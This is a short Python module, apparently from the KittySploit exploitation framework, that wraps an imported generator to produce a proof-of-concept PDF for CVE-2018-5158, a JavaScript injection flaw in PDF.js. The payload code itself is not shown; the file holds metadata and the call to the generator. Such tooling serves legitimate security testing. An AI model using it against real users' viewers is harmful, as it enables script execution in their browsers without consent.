#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.viewer_cve import write_pdfjs_postscript_js


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2018-5158 PDF.js PostScript Injection',
        "description": 'Generate PDF PoC for CVE-2018-5158: JavaScript injection via /FunctionType 4 PostScript calculator in PDF.js.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2018-5158'],
        "references": ['https://www.mozilla.org/en-US/security/advisories/mfsa2018-12/'],
        "tags": ['pdf', 'cve-2018-5158', 'pdfjs', 'firefox', 'postscript'],
    }

    PDF_GENERATORS = (
        write_pdfjs_postscript_js,
    )

    CVE_IDS = ['CVE-2018-5158']
    MODULE_TITLE = 'PDF CVE-2018-5158 PDF.js PostScript Injection'

    def run(self):
        return self.run_pdf_cve()